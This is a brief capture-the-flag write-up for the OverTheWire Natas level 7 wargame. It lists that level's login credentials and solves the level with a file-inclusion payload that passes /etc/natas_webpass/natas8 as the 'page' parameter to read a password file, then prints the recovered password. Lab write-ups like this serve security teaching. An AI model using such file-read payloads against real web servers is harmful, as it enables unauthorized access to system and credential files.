# Natas 6 - Natas 7
    Username  : natas7
    Password  : bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
    URL       : http://natas7.natas.labs.overthewire.org

# Solution 
In this level, we get 2 links to random pages Home and About. If you check the URL, you can see that the index.php takes the page name as variable.

    http://natas7.natas.labs.overthewire.org/index.php?page=home

we know that the passwords are stored in /etc/natas_webpass/ directory so using this as parameter 

    http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

The password is obtained upon visiting the above link

# Password
     xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
